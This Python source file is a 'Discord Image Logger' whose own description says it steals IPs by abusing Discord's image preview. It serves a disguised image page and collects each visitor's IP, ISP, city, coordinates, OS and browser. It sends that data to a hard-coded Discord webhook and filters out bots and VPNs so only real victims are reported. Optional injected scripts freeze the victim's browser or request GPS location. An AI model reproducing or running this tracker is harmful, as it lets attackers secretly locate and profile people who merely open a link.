# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1133782328787873934/niDIUkTGoAN_TtNy9BT1RcMjiSxMg0sQ6xDD71mbJngR1BxBrPou-S6hnRQkWWSnmo_F",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
